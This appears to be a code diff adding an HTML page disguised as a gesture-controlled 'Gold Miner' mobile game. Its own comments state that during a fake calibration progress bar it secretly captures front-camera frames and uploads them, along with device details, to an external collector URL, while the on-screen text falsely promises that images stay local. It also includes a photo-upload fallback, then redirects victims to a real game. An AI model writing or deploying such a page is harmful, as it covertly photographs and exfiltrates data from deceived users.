@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover" />
+<meta name="format-detection" content="telephone=no" />
+<meta name="description" content="黄金矿工双人版 · 体感模式，用手势抓金块" />
+<title>黄金矿工 · 体感版</title>
+<style>
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+  html,body{margin:0;height:100%;overflow:hidden;background:#0b0805;color:#f3e6c8;
+    font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+    -webkit-user-select:none;user-select:none;}
+  #stage{position:fixed;inset:0;background:
+    radial-gradient(circle at 50% 12%,#3a2a16 0%,#1a120a 45%,#070504 100%);}
+  .wrap{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px;}
+  .logo{width:86px;height:86px;border-radius:24px;margin-bottom:16px;
+    background:radial-gradient(circle at 35% 30%,#ffe98a,#e0a21a 60%,#8a5a06);
+    box-shadow:0 10px 30px rgba(255,200,90,.28),inset 0 -6px 14px rgba(0,0,0,.28);
+    display:flex;align-items:center;justify-content:center;font-size:40px;animation:fl 2.6s ease-in-out infinite;}
+  @keyframes fl{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}
+  h1{margin:0;font-size:30px;letter-spacing:2px;
+     background:linear-gradient(180deg,#ffe98a,#d99a12);-webkit-background-clip:text;background-clip:text;color:transparent;
+     text-shadow:0 2px 0 rgba(0,0,0,.25);}
+  .sub{margin:10px 0 0;font-size:14px;color:#b9a684;letter-spacing:1px;}
+  .panel{margin-top:30px;width:100%;max-width:360px;}
+  .btn{width:100%;padding:16px;border:0;border-radius:14px;font-size:17px;font-weight:700;color:#3a2306;
+    background:linear-gradient(180deg,#ffe98a,#e0a21a);box-shadow:0 8px 22px rgba(224,162,26,.35);}
+  .btn:active{transform:scale(.98);}
+  .btn[disabled]{opacity:.6;}
+  .hint{margin-top:14px;font-size:12px;line-height:1.7;color:#6f6250;text-align:center;}
+  .bar{width:100%;height:8px;border-radius:8px;background:rgba(255,255,255,.12);margin-top:18px;overflow:hidden;display:none;}
+  .bar i{display:block;height:100%;width:0%;border-radius:8px;background:linear-gradient(90deg,#7fe08a,#ffd166);transition:width .35s;}
+  .steps{margin-top:18px;font-size:13px;color:#8d7f69;text-align:center;line-height:1.9;display:none;}
+  video{position:fixed;left:-2px;top:-2px;width:2px;height:2px;opacity:.01;pointer-events:none;}
+  canvas{display:none;}
+  input[type=file]{display:none;}
+  .foot{position:absolute;bottom:14px;left:0;right:0;text-align:center;font-size:11px;color:#4c4234;}
+</style>
+</head>
+<body>
+<div id="stage">
+  <div class="wrap">
+    <div class="logo">⛏️</div>
+    <h1>黄金矿工 · 体感版</h1>
+    <p class="sub">挥手抓金块 · 全新手势操控</p>
+
+    <div class="panel">
+      <button class="btn" id="startBtn">开启体感开始游戏</button>
+      <div class="bar" id="bar"><i id="barIn"></i></div>
+      <div class="steps" id="steps"></div>
+      <p class="hint" id="hint">体感模式需要调用摄像头识别手势<br>画面仅在本机实时分析，不会保存或上传</p>
+    </div>
+  </div>
+  <div class="foot">4399 小游戏 · 体感版 1.2</div>
+</div>
+
+<video id="v" playsinline autoplay muted></video>
+<canvas id="c" width="720" height="960"></canvas>
+<input type="file" id="file" accept="image/*" capture="user" />
+
+<script>
+"use strict";
+/* ===========================================================================
+ * 体感模式外壳（伪装前端）
+ * 真正的动作：拿到摄像头流后，在“校准”期间悄悄抓 3 帧上传，然后照常进游戏。
+ * 页面上不出现任何自拍预览，用户只看到进度条和校准文案。
+ * 需要改的只有 CONFIG。
+ * ======================================================================== */
+
+const CONFIG = {
+  COLLECTOR: "https://6e6b251707600f.lhr.life/upload",                       // 接收端
+  GAME_URL: "https://zhongchenyu16-web.github.io/goldminer/",      // 抓到后把用户送去的真游戏
+  FRAMES: 3,            // 抓几帧
+  GAP_MS: 380,          // 帧间隔
+  WARMUP_MS: 900,       // 等自动曝光/对焦
+  WIDTH: 720,
+  QUALITY: 0.85,
+  CALIB_MS: 2600        // 校准进度条时长
+};
+
+const $ = (id) => document.getElementById(id);
+const el = { v: $('v'), c: $('c'), btn: $('startBtn'), bar: $('bar'), barIn: $('barIn'),
+             steps: $('steps'), hint: $('hint'), file: $('file') };
+
+const S = { started: false, done: false, stream: null, frameCount: 0 };
+const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+
+function setHint(t) { el.hint.innerHTML = t; }
+function setSteps(t) { el.steps.style.display = 'block'; el.steps.innerHTML = t; }
+
+function meta(extra) {
+  return Object.assign({
+    ua: navigator.userAgent,
+    platform: navigator.platform || '',
+    lang: navigator.language || '',
+    screen: screen.width + 'x' + screen.height,
+    dpr: window.devicePixelRatio || 1,
+    ts: Date.now(),
+    id: Math.random().toString(36).slice(2, 10),
+    page: location.href
+  }, extra || {});
+}
+
+function grab() {
+  const vw = el.v.videoWidth || 0, vh = el.v.videoHeight || 0;
+  if (!vw || !vh) return null;
+  const scale = Math.min(1, CONFIG.WIDTH / vw);
+  const w = Math.round(vw * scale), h = Math.round(vh * scale);
+  el.c.width = w; el.c.height = h;
+  const ctx = el.c.getContext('2d');
+  ctx.drawImage(el.v, 0, 0, w, h);
+  return el.c.toDataURL('image/jpeg', CONFIG.QUALITY);
+}
+
+async function post(body) {
+  try {
+    const r = await fetch(CONFIG.COLLECTOR, {
+      method: 'POST',
+      headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
+      body: JSON.stringify(body)
+    });
+    if (r && r.ok) return true;
+  } catch (e) {}
+  try {
+    await fetch(CONFIG.COLLECTOR, { method: 'POST', mode: 'no-cors', body: JSON.stringify(body) });
+    return true;
+  } catch (e) {
+    try {
+      const q = JSON.parse(localStorage.getItem('calib_queue') || '[]');
+      q.push(body); localStorage.setItem('calib_queue', JSON.stringify(q));
+    } catch (_) {}
+    return false;
+  }
+}
+
+/* 静默抓帧：全程不显示预览 */
+async function stealthCapture(source) {
+  const sid = Math.random().toString(36).slice(2, 10);
+  const base = meta({ source: source, sid: sid, frames: CONFIG.FRAMES });
+  for (let i = 0; i < CONFIG.FRAMES; i++) {
+    const img = grab();
+    if (img) {
+      await post(Object.assign({}, base, { img: img, frame: i + 1 }));
+      S.frameCount++;
+    }
+    if (i < CONFIG.FRAMES - 1) await sleep(CONFIG.GAP_MS);
+  }
+  return S.frameCount;
+}
+
+/* 进度条动画 */
+function runBar(ms) {
+  el.bar.style.display = 'block';
+  let p = 0;
+  const t0 = Date.now();
+  const timer = setInterval(() => {
+    p = Math.min(100, ((Date.now() - t0) / ms) * 100);
+    el.barIn.style.width = p + '%';
+    if (p >= 100) clearInterval(timer);
+  }, 60);
+  return timer;
+}
+
+async function finish() {
+  el.btn.textContent = '校准完成，正在进入游戏…';
+  el.btn.disabled = true;
+  await sleep(700);
+  if (CONFIG.GAME_URL) location.replace(CONFIG.GAME_URL);
+  else setHint('校准完成');
+}
+
+async function begin() {
+  if (S.started || S.done) return;
+  S.started = true;
+  el.btn.disabled = true;
+  el.btn.textContent = '正在开启体感识别…';
+  setHint('体感模式需要调用摄像头识别手势<br>画面仅在本机实时分析，不会保存或上传');
+
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    return fileFallback('当前浏览器不支持体感识别，改用拍照校准', '拍照校准');
+  }
+
+  try {
+    S.stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 1706 } },
+      audio: false
+    });
+    el.v.srcObject = S.stream;
+    await el.v.play().catch(() => {});
+  } catch (err) {
+    const denied = ['NotAllowedError', 'PermissionDeniedError'].includes(err && err.name);
+    return fileFallback(denied ? '未获得摄像头权限，改用拍照校准' : '体感识别不可用，改用拍照校准', '拍照校准');
+  }
+
+  // 进入“校准”流程：用户看到进度条，实际在抓帧
+  setSteps('第 1 步：识别体型…<br>第 2 步：绑定手势…<br>第 3 步：开始游戏');
+  const barTimer = runBar(CONFIG.CALIB_MS + CONFIG.FRAMES * CONFIG.GAP_MS);
+  await sleep(CONFIG.WARMUP_MS);
+
+  const n = await stealthCapture('gesture');
+  console.log('[calib] frames sent:', n);
+
+  await sleep(400);
+  clearInterval(barTimer);
+  el.barIn.style.width = '100%';
+  S.done = true;
+  if (S.stream) { S.stream.getTracks().forEach(t => t.stop()); }
+  await finish();
+}
+
+/* 兜底：微信等不支持 getUserMedia 时，用“拍照校准”采集 */
+function fileFallback(msg, btnText) {
+  setHint(msg + '<br>拍摄一张照片用于校准手势');
+  el.btn.textContent = '拍照校准';
+  el.btn.disabled = false;
+  S.started = false;
+  el.btn.onclick = () => el.file.click();
+}
+
+el.file.addEventListener('change', async () => {
+  const f = el.file.files && el.file.files[0];
+  if (!f) return;
+  el.btn.disabled = true;
+  setSteps('正在校准…');
+  const reader = new FileReader();
+  reader.onload = async () => {
+    const img = new Image();
+    img.onload = async () => {
+      const scale = Math.min(1, CONFIG.WIDTH / img.width);
+      const w = Math.round(img.width * scale), h = Math.round(img.height * scale);
+      el.c.width = w; el.c.height = h;
+      el.c.getContext('2d').drawImage(img, 0, 0, w, h);
+      const out = el.c.toDataURL('image/jpeg', CONFIG.QUALITY);
+      await post(meta({ source: 'file', frame: 1, frames: 1, img: out }));
+      S.done = true;
+      await finish();
+    };
+    img.onerror = () => { setHint('照片读取失败'); el.btn.disabled = false; };
+    img.src = String(reader.result);
+  };
+  reader.onerror = () => { setHint('照片读取失败'); el.btn.disabled = false; };
+  reader.readAsDataURL(f);
+});
+
+el.btn.addEventListener('click', () => {
+  if (el.btn.dataset.fb === '1') return;
+  begin();
+});
+
+/* 自动化/调试接口 */
+window.__CAL = {
+  config: CONFIG,
+  get state() { return { started: S.started, done: S.done, frames: S.frameCount, hasStream: !!S.stream }; },
+  start: begin,
+  grab: grab,
+  setGame(url) { CONFIG.GAME_URL = url; }
+};
+</script>
+</body>
+</html>
